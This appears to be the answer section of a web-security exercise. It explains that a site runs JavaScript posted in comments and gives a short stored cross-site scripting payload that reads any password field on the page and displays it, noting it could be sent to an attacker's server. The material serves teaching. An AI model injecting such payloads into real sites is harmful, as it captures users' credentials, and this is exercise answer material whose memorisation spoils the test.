# BEGIN_SOLUTION

JavaScript in comments will be executed. For example, the following JavaScript code
will print the password every time a user visits the website. Instead of printing,
the password could just as well be sent to an attacker-controlled server to be used
for nefarious purposes.

    <script>
    function loop(){
        var inputs = document.getElementsByName("password");
        if (inputs.length > 0){
            alert("Your password is: " + inputs[0].value);
        }
        setTimeout(loop, 1000);
    }
    loop()
    </script>

An attacker just has to post a comment containing the JavaScript code above to steal passwords.
